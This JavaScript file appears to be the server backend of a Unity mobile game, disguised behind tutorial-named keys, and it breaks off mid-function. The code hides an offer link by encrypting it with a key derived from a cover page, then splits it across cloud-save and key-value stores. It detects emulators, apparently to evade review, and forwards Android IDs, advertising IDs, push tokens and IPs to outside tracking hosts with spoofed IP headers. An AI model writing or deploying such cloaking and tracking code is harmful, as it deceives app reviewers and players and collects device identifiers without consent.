const HINT = "tut_hint";
const DAY = "tut_day";
const PAGE = "tut_page";
const CLICK = "https://banda-track-api.space/api/click-trusted";
const HOLD = "https://banda-track-api.space/api/android-id-rules/block";
const NOTE = "https://adjust-binom-monitor.oleksandr-teamlead-unitydev.workers.dev/api/block-events";


function norm(s) {
  return String(s || "").replace(/\r\n/g, "\n").replace(/\r/g, "\n").trim();
}
function slots(c) {
  const o = [];
  for (let i = 0; i < c.length; i++) {
    const x = c.charCodeAt(i);
    if ((x >= 65 && x <= 90) || (x >= 97 && x <= 122)) o.push(i);
  }
  return o;
}
function stripMarkup(html) {
  let s = String(html || "");
  s = s.replace(/<script[\s\S]*?<\/script>/gi, " ");
  s = s.replace(/<style[\s\S]*?<\/style>/gi, " ");
  s = s.replace(/<noscript[\s\S]*?<\/noscript>/gi, " ");
  s = s.replace(/<!--[\s\S]*?-->/g, " ");
  s = s.replace(/<br\s*\/?>/gi, "\n");
  s = s.replace(/<\/(p|div|h[1-6]|li|tr)>/gi, "\n");
  s = s.replace(/<[^>]+>/g, " ");
  s = s.replace(/&nbsp;/g, " ").replace(/&amp;/g, "&").replace(/&quot;/g, "\"").replace(/&#39;/g, "'").replace(/&lt;/g, "<").replace(/&gt;/g, ">");
  s = s.replace(/\r\n/g, "\n").replace(/\r/g, "\n");
  s = s.replace(/[ \t]+\n/g, "\n").replace(/\n[ \t]+/g, "\n");
  s = s.replace(/[ \t]{2,}/g, " ");
  s = s.replace(/\n{3,}/g, "\n\n");
  return s.trim();
}
function mixLetters(text, pid) {
  const base = norm(text);
  const id = String(pid || "");
  if (!base) return "";
  if (!id) return base;
  const s = slots(base);
  if (s.length < id.length) return base + "\n" + id;
  const chars = base.split("");
  for (let i = 0; i < id.length; i++) chars[s[i]] = id[i];
  return chars.join("");
}
function jwtBag(token) {
  try {
    const p = String(token || "").split(".")[1];
    if (!p) return {};
    let s = p.replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    return JSON.parse(utf8Text(b64Decode(s))) || {};
  } catch {
    return {};
  }
}
function jwtClaim(bag, names) {
  for (let i = 0; i < names.length; i++) {
    const v = bag && bag[names[i]];
    if (v != null && String(v)) return String(v);
  }
  return "";
}
function loadDesk(env) {
  let page = String((env && env.PAGE_HREF) || "");
  const cut = page.indexOf("|");
  if (cut >= 0) page = page.slice(0, cut);
  return { page: page.trim() };
}
async function loadMarkup(page) {
  if (!page) return "";
  try {
    const r = await call(page, {
      method: "GET",
      headers: { Accept: "text/html,text/plain,*/*", "User-Agent": "Mozilla/5.0" }
    }, 6000);
    if (r && r.status >= 200 && r.status < 300 && r.text)
      return stripMarkup(r.text);
  } catch {}
  return "";
}
const SBOX = new Uint8Array([99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22]);
const RCON = new Uint8Array([0,1,2,4,8,16,32,64,128,27,54]);
function asU8(x) {
  if (x instanceof Uint8Array) return x;
  if (x && typeof x.length === "number") return Uint8Array.from(x);
  return new Uint8Array(0);
}
function utf8Bytes(s) {
  return new TextEncoder().encode(String(s || ""));
}
function utf8Text(buf) {
  return new TextDecoder().decode(asU8(buf));
}
function b64Encode(buf) {
  const u8 = asU8(buf);
  let bin = "";
  const chunk = 0x8000;
  for (let i = 0; i < u8.length; i += chunk)
    bin += String.fromCharCode.apply(null, u8.subarray(i, i + chunk));
  return btoa(bin);
}
function b64Decode(s) {
  const bin = atob(String(s || ""));
  const u8 = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) u8[i] = bin.charCodeAt(i);
  return u8;
}
function sha256(data) {
  const bytes = asU8(data);
  const K = new Uint32Array([0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2]);
  let h0 = 0x6a09e667, h1 = 0xbb67ae85, h2 = 0x3c6ef372, h3 = 0xa54ff53a, h4 = 0x510e527f, h5 = 0x9b05688c, h6 = 0x1f83d9ab, h7 = 0x5be0cd19;
  const bitLo = (bytes.length * 8) >>> 0;
  const bitHi = Math.floor((bytes.length * 8) / 0x100000000);
  const pad = new Uint8Array(((bytes.length + 9 + 63) >> 6) << 6);
  pad.set(bytes);
  pad[bytes.length] = 0x80;
  const dv = new DataView(pad.buffer);
  dv.setUint32(pad.length - 8, bitHi);
  dv.setUint32(pad.length - 4, bitLo);
  const rotr = (x, n) => (x >>> n) | (x << (32 - n));
  for (let i = 0; i < pad.length; i += 64) {
    const w = new Uint32Array(64);
    for (let j = 0; j < 16; j++) w[j] = dv.getUint32(i + j * 4);
    for (let j = 16; j < 64; j++) {
      const s0 = rotr(w[j - 15], 7) ^ rotr(w[j - 15], 18) ^ (w[j - 15] >>> 3);
      const s1 = rotr(w[j - 2], 17) ^ rotr(w[j - 2], 19) ^ (w[j - 2] >>> 10);
      w[j] = (w[j - 16] + s0 + w[j - 7] + s1) >>> 0;
    }
    let a = h0, b = h1, c = h2, d = h3, e = h4, f = h5, g = h6, h = h7;
    for (let j = 0; j < 64; j++) {
      const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
      const ch = (e & f) ^ ((~e) & g);
      const t1 = (h + S1 + ch + K[j] + w[j]) >>> 0;
      const S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
      const maj = (a & b) ^ (a & c) ^ (b & c);
      const t2 = (S0 + maj) >>> 0;
      h = g; g = f; f = e; e = (d + t1) >>> 0; d = c; c = b; b = a; a = (t1 + t2) >>> 0;
    }
    h0 = (h0 + a) >>> 0; h1 = (h1 + b) >>> 0; h2 = (h2 + c) >>> 0; h3 = (h3 + d) >>> 0;
    h4 = (h4 + e) >>> 0; h5 = (h5 + f) >>> 0; h6 = (h6 + g) >>> 0; h7 = (h7 + h) >>> 0;
  }
  const out = new Uint8Array(32);
  const o = new DataView(out.buffer);
  o.setUint32(0, h0); o.setUint32(4, h1); o.setUint32(8, h2); o.setUint32(12, h3);
  o.setUint32(16, h4); o.setUint32(20, h5); o.setUint32(24, h6); o.setUint32(28, h7);
  return out;
}
function subWord(w) {
  return ((SBOX[(w >>> 24) & 255] << 24) | (SBOX[(w >>> 16) & 255] << 16) | (SBOX[(w >>> 8) & 255] << 8) | SBOX[w & 255]) >>> 0;
}
function rotWord(w) {
  return ((w << 8) | (w >>> 24)) >>> 0;
}
function expandKey(keyBytes) {
  const key = asU8(keyBytes);
  const Nk = 8, Nr = 14;
  const w = new Uint32Array(4 * (Nr + 1));
  const copy = key.byteLength === 32 && key.byteOffset === 0 ? key : Uint8Array.from(key.subarray(0, 32));
  const kdv = new DataView(copy.buffer, copy.byteOffset, 32);
  for (let i = 0; i < Nk; i++) w[i] = kdv.getUint32(i * 4);
  for (let i = Nk; i < 4 * (Nr + 1); i++) {
    let t = w[i - 1];
    if (i % Nk === 0) t = subWord(rotWord(t)) ^ ((RCON[i / Nk] << 24) >>> 0);
    else if (i % Nk === 4) t = subWord(t);
    w[i] = (w[i - Nk] ^ t) >>> 0;
  }
  return w;
}
function xtime(a) {
  return ((a & 0x80) ? ((a << 1) ^ 0x1b) : (a << 1)) & 255;
}
function mixCol(s, i) {
  const a = s[i], b = s[i + 1], c = s[i + 2], d = s[i + 3];
  const e = a ^ b ^ c ^ d;
  s[i] ^= e ^ xtime(a ^ b);
  s[i + 1] ^= e ^ xtime(b ^ c);
  s[i + 2] ^= e ^ xtime(c ^ d);
  s[i + 3] ^= e ^ xtime(d ^ a);
}
function aesBlock(w, input) {
  const s = new Uint8Array(16);
  s.set(asU8(input).subarray(0, 16));
  const add = (r) => {
    for (let c = 0; c < 4; c++) {
      const k = w[r * 4 + c];
      s[c * 4] ^= (k >>> 24) & 255;
      s[c * 4 + 1] ^= (k >>> 16) & 255;
      s[c * 4 + 2] ^= (k >>> 8) & 255;
      s[c * 4 + 3] ^= k & 255;
    }
  };
  add(0);
  for (let r = 1; r < 14; r++) {
    for (let i = 0; i < 16; i++) s[i] = SBOX[s[i]];
    const t1 = s[1]; s[1] = s[5]; s[5] = s[9]; s[9] = s[13]; s[13] = t1;
    const t2 = s[2]; s[2] = s[10]; s[10] = t2; const t6 = s[6]; s[6] = s[14]; s[14] = t6;
    const t3 = s[15]; s[15] = s[11]; s[11] = s[7]; s[7] = s[3]; s[3] = t3;
    mixCol(s, 0); mixCol(s, 4); mixCol(s, 8); mixCol(s, 12);
    add(r);
  }
  for (let i = 0; i < 16; i++) s[i] = SBOX[s[i]];
  const u1 = s[1]; s[1] = s[5]; s[5] = s[9]; s[9] = s[13]; s[13] = u1;
  const u2 = s[2]; s[2] = s[10]; s[10] = u2; const u6 = s[6]; s[6] = s[14]; s[14] = u6;
  const u3 = s[15]; s[15] = s[11]; s[11] = s[7]; s[7] = s[3]; s[3] = u3;
  add(14);
  return s;
}
function xorBlock(a, b, n) {
  const o = new Uint8Array(n);
  for (let i = 0; i < n; i++) o[i] = a[i] ^ b[i];
  return o;
}
function inc32(block) {
  const o = new Uint8Array(block);
  for (let i = 15; i >= 12; i--) {
    o[i] = (o[i] + 1) & 255;
    if (o[i]) break;
  }
  return o;
}
function ghashMul(X, Y) {
  const Z = new Uint8Array(16);
  const V = new Uint8Array(Y);
  for (let i = 0; i < 16; i++) {
    for (let bit = 7; bit >= 0; bit--) {
      if ((X[i] >>> bit) & 1) {
        for (let k = 0; k < 16; k++) Z[k] ^= V[k];
      }
      const lsb = V[15] & 1;
      for (let k = 15; k > 0; k--) V[k] = (V[k] >>> 1) | ((V[k - 1] & 1) << 7);
      V[0] >>>= 1;
      if (lsb) V[0] ^= 0xe1;
    }
  }
  return Z;
}
function ghash(H, cipher) {
  let Y = new Uint8Array(16);
  const len = cipher.length;
  for (let i = 0; i < len; i += 16) {
    const block = new Uint8Array(16);
    const n = Math.min(16, len - i);
    block.set(cipher.subarray(i, i + n));
    Y = ghashMul(xorBlock(Y, block, 16), H);
  }
  const lenBlock = new Uint8Array(16);
  const bits = len * 8;
  const dv = new DataView(lenBlock.buffer);
  dv.setUint32(12, bits >>> 0);
  dv.setUint32(8, Math.floor(bits / 0x100000000));
  return ghashMul(xorBlock(Y, lenBlock, 16), H);
}
function gcmCrypt(w, j0, data) {
  let ctr = inc32(j0);
  const out = new Uint8Array(data.length);
  for (let i = 0; i < data.length; i += 16) {
    const ks = aesBlock(w, ctr);
    const n = Math.min(16, data.length - i);
    for (let j = 0; j < n; j++) out[i + j] = data[i + j] ^ ks[j];
    ctr = inc32(ctr);
  }
  return out;
}
function aesGcmEncrypt(key, nonce, pt) {
  const w = expandKey(key);
  const H = aesBlock(w, new Uint8Array(16));
  const j0 = new Uint8Array(16);
  j0.set(asU8(nonce).subarray(0, 12));
  j0[15] = 1;
  const p = asU8(pt);
  const cipher = gcmCrypt(w, j0, p);
  const tag = xorBlock(aesBlock(w, j0), ghash(H, cipher), 16);
  return { cipher, tag };
}
function aesGcmDecrypt(key, nonce, cipher, tag) {
  const w = expandKey(key);
  const H = aesBlock(w, new Uint8Array(16));
  const j0 = new Uint8Array(16);
  j0.set(asU8(nonce).subarray(0, 12));
  j0[15] = 1;
  const c = asU8(cipher);
  const expect = xorBlock(aesBlock(w, j0), ghash(H, c), 16);
  const got = asU8(tag);
  let ok = expect.length === got.length;
  for (let i = 0; i < expect.length; i++) if (expect[i] !== got[i]) ok = false;
  if (!ok) throw new Error("tag");
  return gcmCrypt(w, j0, c);
}
function rndBytes(n) {
  const a = new Uint8Array(n);
  let filled = false;
  try {
    const g = (typeof globalThis !== "undefined" && globalThis.crypto) || (typeof self !== "undefined" && self.crypto);
    if (g && g.getRandomValues) {
      g.getRandomValues(a);
      filled = true;
    }
  } catch {}
  if (!filled) {
    let x = Date.now() ^ (n * 2654435761);
    for (let i = 0; i < n; i++) {
      x ^= x << 13; x ^= x >>> 17; x ^= x << 5;
      a[i] = (x + Math.floor(Math.random() * 256)) & 255;
    }
  }
  return a;
}
function pack3(a, b, c) {
  const o = new Uint8Array(a.length + b.length + c.length);
  o.set(asU8(a), 0);
  o.set(asU8(b), a.length);
  o.set(asU8(c), a.length + b.length);
  return o;
}
function keyBytes(cover) {
  return sha256(utf8Bytes(norm(cover)));
}
function toUrl(buf) {
  return b64Encode(buf).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}
function fromUrl(t) {
  if (!t) return null;
  let s = String(t).replace(/-/g, "+").replace(/_/g, "/");
  while (s.length % 4) s += "=";
  return b64Decode(s);
}
function foldOut(cover, token) {
  try {
    const packed = fromUrl(token);
    if (!packed || packed.length < 28) return "";
    const key = keyBytes(norm(cover));
    const pt = aesGcmDecrypt(key, packed.subarray(0, 12), packed.subarray(12, packed.length - 16), packed.subarray(packed.length - 16));
    return utf8Text(pt);
  } catch {
    return "";
  }
}
function foldIn(cover, plain) {
  try {
    const key = keyBytes(cover);
    const nonce = rndBytes(12);
    const { cipher, tag } = aesGcmEncrypt(key, nonce, utf8Bytes(String(plain || "")));
    return toUrl(pack3(nonce, cipher, tag));
  } catch {
    return "";
  }
}
function clean(v, n) {
  return String(v || "").trim().slice(0, n || 2048);
}
function isBlankStore(v) {
  const s = String(v || "").trim().toLowerCase().replace(/-/g, "");
  return !s || /^0+$/.test(s);
}
function asText(data) {
  if (data == null) return "";
  if (typeof data === "string") return data;
  if (data instanceof Uint8Array) return utf8Text(data);
  try { return JSON.stringify(data); } catch { return String(data); }
}
function looseLink(v) {
  let text = String(v || "").trim();
  if (!text || text === "[object Object]") return "";
  text = text.replace(/^"+|"+$/g, "").replace(/^'+|'+$/g, "");
  text = text.replace(/\\"/g, '"').replace(/\\\//g, "/");
  if (text.toLowerCase().startsWith("ttp")) text = "h" + text;
  const m = text.match(/https?:\/\/[^\s"'<>\\]+/i);
  return m ? m[0] : (/^https?:\/\//i.test(text) ? text.split(/\s/)[0] : "");
}
function pickLink(raw, depth) {
  if (depth > 6 || raw == null) return "";
  if (typeof raw === "string") {
    const s = raw.trim();
    const direct = looseLink(s);
    if (direct) return direct;
    try {
      if (s.charAt(0) === "{" || s.charAt(0) === "[") return pickLink(JSON.parse(s), depth + 1);
    } catch {}
    return "";
  }
  if (typeof raw !== "object") return "";
  const prefer = ["link", "finalUrl", "final_url", "FinalUrl", "finalURL", "FinalURL", "clickUrl", "click_url", "redirectUrl", "redirect_url", "url", "href", "offerUrl", "offer_url", "destination", "result", "data"];
  for (let i = 0; i < prefer.length; i++) {
    if (raw[prefer[i]] != null) {
      const hit = pickLink(raw[prefer[i]], depth + 1);
      if (hit) return hit;
    }
  }
  const keys = Object.keys(raw);
  for (let i = 0; i < keys.length; i++) {
    const k = String(keys[i]).toLowerCase();
    if (k === "error" || k === "naming" || k === "headers") continue;
    const hit = pickLink(raw[keys[i]], depth + 1);
    if (hit) return hit;
  }
  return "";
}
function pullLink(raw) {
  return pickLink(raw, 0) || pickLink(asText(raw), 0);
}
const MARKS = ["android sdk built for","sdk_gphone","sdk_google","google_sdk","genymotion","bluestacks","blue stacks","noxplayer","nox","ldplayer","mumu","memu","andyroid","droid4x","virtualbox","vbox","qemu","goldfish","ranchu","swiftshader","opengl es translator","virtio"];
const GPU_MARKS = ["swiftshader","android emulator","opengl es translator","llvmpipe","lavapipe","softpipe","host gpu","offscreen","virtio","vmware","virtualbox","parallels","qemu","goldfish","ranchu","emulator","simulator"];
function noisy(hid, uga, osv, mdl, gdn, gdv) {
  if (clean(hid, 128).toLowerCase() === "9774d56d682e549c") return true;
  const fields = [uga, osv, mdl, gdn, gdv];
  for (const raw of fields) {
    const v = clean(raw, 2048).toLowerCase();
    if (!v) continue;
    if (MARKS.some((m) => v.includes(m))) return true;
    if (/(^|[; /_(])x86(?:_64)?([-; /_)]|$)/i.test(v)) return true;
  }
  const gpu = [gdn, gdv];
  for (let i = 0; i < gpu.length; i++) {
    const v = clean(gpu[i], 2048).toLowerCase();
    if (!v) continue;
    if (GPU_MARKS.some((m) => v.includes(m))) return true;
  }
  return false;
}
function secretVal(env, name) {
  try {
    const v = env && env[name];
    return v ? String(v) : "";
  } catch {
    return "";
  }
}
async function call(url, opts, ms) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), ms || 8000);
  try {
    const init = Object.assign({ signal: ctrl.signal }, opts || {});
    if (init.maxRedirects === 0) init.redirect = "manual";
    delete init.maxRedirects;
    delete init.transformResponse;
    const r = await fetch(url, init);
    const text = await r.text();
    let data = text;
    try { data = JSON.parse(text); } catch {}
    const loc = r.headers.get("location")
      || r.headers.get("Location")
      || r.headers.get("x-final-url")
      || r.headers.get("x-offer-url")
      || r.headers.get("content-location")
      || "";
    return { status: r.status, data, text, url: r.url || url, headers: { location: loc, Location: loc } };
  } catch (e) {
    const err = String((e && e.name) || "err") + ":" + String((e && e.message) || e || "");
    return { status: 0, data: "", text: "", url: url, headers: {}, error: err };
  } finally {
    clearTimeout(t);
  }
}
function clientIp(request) {
  const h = request && request.headers;
  if (!h) return "";
  return clean(h.get("CF-Connecting-IP") || h.get("True-Client-IP") || h.get("X-Real-IP") || "", 64);
}
function persistPage(projectId, playerId, locked) {
  const base = "https://cloud-save.services.api.unity.com/v1/data/projects/" + projectId + "/players/" + playerId + "/items";
  return locked ? base + "/protected" : base;
}
async function saveGet(accessToken, projectId, playerId, keys, locked) {
  const q = (keys || []).map((k) => "keys=" + encodeURIComponent(k)).join("&");
  const r = await call(persistPage(projectId, playerId, locked) + (q ? "?" + q : ""), {
    method: "GET",
    headers: { Authorization: "Bearer " + accessToken, Accept: "application/json" }
  }, 8000);
  if (!r || r.status < 200 || r.status >= 300) return null;
  return r.data;
}
async function saveSet(accessToken, projectId, playerId, key, value, locked) {
  const r = await call(persistPage(projectId, playerId, locked), {
    method: "POST",
    headers: { Authorization: "Bearer " + accessToken, "Content-Type": "application/json" },
    body: JSON.stringify({ key, value })
  }, 8000);
  if (!r || r.status < 200 || r.status >= 300) throw new Error("save " + (r && r.status));
}
function split3(token) {
  const s = String(token || "");
  const a = Math.ceil(s.length / 3) || 0;
  return [s.slice(0, a), s.slice(a, a * 2), s.slice(a * 2)];
}
function kvNs(env) {
  return (env && env.OFFER_C) || null;
}
async function putKv(env, slot, pid, part) {
  const kv = kvNs(env);
  if (!kv || (slot !== "b" && slot !== "c") || !pid || !part) {
    try { console.log("kv skip " + slot); } catch {}
    return false;
  }
  try {
    await kv.put(slot + ":" + pid, String(part));
    try { console.log("kv write " + slot + " ok"); } catch {}
    return true;
  } catch (e) {
    try { console.log("kv write " + slot + " fail " + (e && e.message ? e.message : "err")); } catch {}
    return false;
  }
}
async function readSlotPart(env, request, slot) {
  if (slot !== "b" && slot !== "c") return reply("", 200);
  const raw = request.method === "GET" ? "" : await request.text();
  const input = jsonInput(request, raw);
  const accessToken = clean(input.grant, 4096) || clean(input.accessToken, 4096);
  const claims = jwtBag(accessToken);
  const pid = jwtClaim(claims, ["player_id", "playerId", "sub"]) || clean(input.playerId, 128);
  if (!pid) return reply("", 200);
  const kv = kvNs(env);
  if (!kv) {
    try { console.log("kv skip " + slot); } catch {}
    return reply("", 200);
  }
  let part = "";
  try { part = (await kv.get(slot + ":" + pid)) || ""; } catch (e) {
    try { console.log("kv read " + slot + " fail " + (e && e.message ? e.message : "err")); } catch {}
    return reply("", 200);
  }
  if (!part) return reply("", 200);
  return reply(part, 200);
}
function withIp(headers, ip) {
  if (!ip) return headers;
  return Object.assign({}, headers, {
    "X-Forwarded-For": ip,
    "X-Real-IP": ip,
    "X-Client-IP": ip,
    "Client-IP": ip
  });
}
async function runSave(env, request, input) {
  try {
  const accessToken = clean(input.grant, 4096) || clean(input.accessToken, 4096);
  const claims = jwtBag(accessToken);
  const projectId = clean(input.projectId, 128) || jwtClaim(claims, ["project_id", "projectId"]);
  const pidHint = clean(input.playerId, 128) || jwtClaim(claims, ["player_id", "playerId", "sub"]);
  const page = loadDesk(env).page || "";
  if (!page) return "";
  let raw = "";
  try { raw = await loadMarkup(page); } catch {}
  const cover = mixLetters(raw, pidHint);
  if (!cover) return "";
  const yes = () => foldIn(cover, "200") || "";
  const pid = pidHint;
  const aid = clean(input.aid, 256) || clean(input.appId, 256);
  const hidRaw = clean(input.hid, 256) || clean(input.androidId, 256);
  const hid = hidRaw;
  const uga = clean(input.uga, 2048) || clean(input.userAgent, 2048);
  const rid = clean(input.rid, 128);
  const gidRaw = clean(input.gid, 256) || clean(input.adId, 256);
  const gid = isBlankStore(gidRaw) ? hid : gidRaw;
  const psh = clean(input.psh, 512) || clean(input.pushToken, 512);
  const sid = clean(input.sid, 128);
  const ref = clean(input.entry, 2048) || clean(input.referer, 2048);
  const osv = clean(input.osv, 64) || clean(input.os_version, 64);
  const apv = clean(input.apv, 64) || clean(input.app_version, 64);
  const mdl = clean(input.mdl, 128);
  const gdn = clean(input.gdn, 128);
  const gdv = clean(input.gdv, 128);
  const ip = clientIp(request) || clean(input.ip, 64);

  function note(msg) {
    try { console.log(msg); } catch {}
  }

  async function storeSave(t, k) {
    try {
      if (t) await saveSet(accessToken, projectId, pid, HINT, t, true);
      await saveSet(accessToken, projectId, pid, DAY, k, true);
      note("write store=cloudsave protected");
    } catch (e) {
      note("write protected fail " + (e && e.message ? e.message : "err"));
    }
    try {
      if (t) await saveSet(accessToken, projectId, pid, HINT, t, false);
      await saveSet(accessToken, projectId, pid, DAY, k, false);
      note("write store=cloudsave default");
    } catch (e) {
      note("write default fail " + (e && e.message ? e.message : "err"));
    }
  }

  async function storePage() {
    if (!pid || !page) return;
    try {
      await saveSet(accessToken, projectId, pid, PAGE, page, true);
    } catch (e) {
      note("write page protected fail " + (e && e.message ? e.message : "err"));
    }
    try {
      await saveSet(accessToken, projectId, pid, PAGE, page, false);
      note("write page");
    } catch (e) {
      note("write page fail " + (e && e.message ? e.message : "err"));
    }
  }

  function asStr(v) {
    if (v == null) return "";
    if (typeof v === "number" || typeof v === "boolean") return String(v);
    if (typeof v === "string") return v.replace(/^"+|"+$/g, "").trim();
    if (typeof v === "object") {
      if (v.value != null) return asStr(v.value);
      try { return asStr(JSON.stringify(v)); } catch { return ""; }
    }
    return String(v).trim();
  }

  function bagFrom(got) {
    const rows = (got && got.data && got.data.results) || (got && got.results) || [];
    const o = {};
    for (let i = 0; i < rows.length; i++) {
      const row = rows[i];
      if (!row || !row.key) continue;
      o[row.key] = asStr(row.value);
    }
    return o;
  }

  async function fetchKeys(keys, locked) {
    return await saveGet(accessToken, projectId, pid, keys, locked);
  }

  function readFlag(raw) {
    const s = asStr(raw);
    if (s === "0" || s === "1") return s;
    return "";
  }

  async function readSave() {
    let bag = {};
    try { bag = bagFrom(await fetchKeys([HINT, DAY], false)) || {}; } catch (e) {
      note("read cloudsave fail default " + (e && e.message ? e.message : "err"));
    }
    let t = bag[HINT] || "";
    let k = readFlag(bag[DAY] || "");
    if (!t && k !== "0") {
      try {
        const locked = bagFrom(await fetchKeys([HINT, DAY], true)) || {};
        if (locked[HINT] || locked[DAY]) bag = Object.assign({}, bag, locked);
        t = bag[HINT] || "";
        k = readFlag(bag[DAY] || "");
      } catch (e) {
        note("read cloudsave fail protected " + (e && e.message ? e.message : "err"));
      }
    }
    if (t || k === "0") return { t: t || "", k: k === "0" ? "0" : (k || "1") };
    return null;
  }

  function isBlock(h) {
    return !!(h && h.k === "0");
  }

  function isOffer(h) {
    return !!(h && h.k !== "0" && h.t);
  }

  async function loadExisting() {
    let saveHit = null;
    try { saveHit = await readSave(); } catch (e) {
      note("read cloudsave fail " + (e && e.message ? e.message : "err"));
    }
    if (saveHit && (saveHit.t || saveHit.k === "0")) note("read store=cloudsave");
    if (isBlock(saveHit)) {
      note("store hit block");
      return { t: saveHit.t || "", k: "0" };
    }
    if (isOffer(saveHit)) {
      note("store hit offer");
      return saveHit;
    }
    note("read empty");
    return null;
  }

  async function store(flag, href) {
    const k = flag === "1" ? "1" : "0";
    const n = k === "1" ? looseLink(href) : "";
    if (k === "1" && !n) return null;
    if (k !== "1") {
      try { await storeSave("", k); } catch {}
      note("write store=cloudsave block");
      return { t: "", k };
    }
    const token = foldIn(cover, n);
    if (!token) return null;
    const parts = split3(token);
    let kvB = false;
    let kvC = false;
    try { kvB = await putKv(env, "b", pid, parts[1]); } catch (e) {
      note("kv b fail " + (e && e.message ? e.message : "err"));
    }
    try { kvC = await putKv(env, "c", pid, parts[2]); } catch (e) {
      note("kv c fail " + (e && e.message ? e.message : "err"));
    }
    if (!kvB || !kvC) {
      note("split write incomplete kvb=" + kvB + " kvc=" + kvC);
      return null;
    }
    try { await storeSave(parts[0], k); } catch (e) {
      note("cloudsave fail " + (e && e.message ? e.message : "err"));
      return null;
    }
    note("write store=split cloudsave+kv-b+kv-c");
    return { t: parts[0], k };
  }
  async function done(flag, href) {
    try {
      const pack = await store(flag, href);
      if (!pack) return false;
      return pack.k === "0" || !!pack.t;
    } catch {
      return false;
    }
  }
  async function noteHold(reason, status) {
    const href = NOTE;
    const tok = secretVal(env, "NOTE_KEY");
    if (!href || !tok) return;
    try {
      await call(href, {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: "Bearer " + tok },
        body: JSON.stringify({
          appId: aid,
          blockedBy: "api",
          reason: reason || "",
          httpStatus: status == null ? null : status,
          ip: ip || null,
          adid: gid || null,
          androidId: hid || null,
          occurredAt: new Date().toISOString()
        })
      }, 2500);
    } catch {}
  }
  async function fail(reason, status) {
    note("fail " + (reason || "err") + (status == null ? "" : " " + status));
    try { await noteHold(reason, status); } catch {}
    return done("0", "");
  }
  async function skip(reason, status) {
    note("skip " + (reason || "err") + (status == null ? "" : " " + status));
    try { await noteHold(reason, status); } catch {}
    return yes();
  }

  const clickKey = secretVal(env, "CLICK_KEY");
  const device = clean(input.did, 128) || clean(input.deviceID, 128);
  const advertisingId = isBlankStore(gid) ? hid : (gid || hid);
  if (isBlankStore(gidRaw) && hid)
    note("adId zero, advertising_id=androidId " + hid);
  const payload = {
    appId: aid,
    deviceID: device,
    adId: advertisingId,
    advertising_id: advertisingId,
    pushToken: psh,
    userAgent: uga,
    app_version: apv,
    androidId: hid,
    android_id: hid,
    referer: ref,
    ip
  };
  if (!isBlankStore(gidRaw)) payload.gps_adid = gidRaw;
  if (sid) payload.sendId = sid;
  if (osv) payload.os_version = osv;
  if (rid) payload.requestId = rid;

  async function sendClick() {
    if (!ip) {
      note("click skip no_ip");
      return { href: "", status: 0 };
    }
    note("click send app=" + aid + " androidId=" + hid + " ip=" + ip);
    try {
      const u = await call(CLICK, {
        method: "POST",
        headers: withIp({ "Content-Type": "application/json", "X-Click-Token": clickKey, "User-Agent": uga, Accept: "application/json,text/plain,*/*" }, ip),
        body: JSON.stringify(payload),
        maxRedirects: 0
      }, 25000);
      const dump = asText(u && u.data) || (u && u.text) || "";
      const loc = (u && u.headers && (u.headers.location || u.headers.Location)) || "";
      let href = pullLink(u && u.data) || pullLink(dump) || looseLink(loc) || looseLink(u && u.url);
      if (!href && loc) {
        try { href = looseLink(new URL(loc, CLICK).href); } catch {}
      }
      if (href && href.indexOf("banda-track-api.space") >= 0)
        href = "";
      note("click status=" + ((u && u.status) || 0) + " href=" + (href ? 1 : 0) + " body=" + dump.length + (u && u.error ? " err=" + u.error : ""));
      return { href: href || "", status: (u && u.status) || 0, error: (u && u.error) || "" };
    } catch (e) {
      note("click err " + (e && e.message ? e.message : "err"));
      return { href: "", status: 0, error: e && e.message ? e.message : "err" };
    }
  }

  if (!pid) return "";
  if (input && input._sealedFail) {
    note("open bag fail, skip click");
    return yes();
  }
  try { await storePage(); } catch {}
  let hit = null;
  try { hit = await loadExisting(); } catch (e) {
    note("read store fail " + (e && e.message ? e.message : "err"));
  }
  const parkedIn = clean(input.park, 8) === "1";
  if (parkedIn || (hit && hit.k === "0")) {
    note("block, skip click");
    try { await storePage(); } catch {}
    try { await done("0", ""); } catch {}
    return yes();
  }
  if (hit && hit.t) {
    note("store hit offer, skip click");
    return yes();
